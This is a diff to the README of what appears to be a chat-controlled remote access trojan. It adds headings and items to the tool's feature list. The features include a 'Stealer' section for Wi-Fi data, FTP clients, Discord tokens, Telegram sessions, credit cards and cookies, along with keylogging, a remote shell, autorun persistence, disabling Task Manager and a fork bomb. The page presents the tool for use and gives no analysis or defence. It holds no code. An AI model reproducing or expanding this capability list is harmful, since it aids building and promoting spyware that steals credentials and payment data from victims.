@@ -28,9 +28,12 @@
   * To get a list of commands, use `/help`
 
 # :rose: Functions
+
+### _Network_
 * Location by BSSID
 * System Information
 
+### _Main_
 * Desktop Capture
 * Webcam Capture
 * Sound Capture
@@ -44,6 +47,7 @@
    * Add to Autorun
    * Uninstall
 
+### _Files_
 * Files Manager
    * Current Directory
    * List of Files
@@ -59,12 +63,17 @@
      * Kill all Processes
      * Disable Task Manager
 
+### _Fun_
 * Send Message
 * Speak Message
 * Open URL
 * Set Wallpapers
 * ForkBomb
 
+
+### _Stealer_
+* Wi-Fi Data
+* FTP Client
 * Discord Token
 * Telegram Session
 * Get CreditCards
@@ -73,11 +82,19 @@
 * Get Cookies
 * Get History
 
+
+### _Other_
 * Clipboard Editing
+* Receive Keylogs
 * Monitor Control
+* Volume Control
 * Display Rotate
 * Block Input
+* CD-ROM
+
+### _Scripting_
 * Remote Shell
+* Batch Scripting
 
 # Screenshots
 <p align="center">
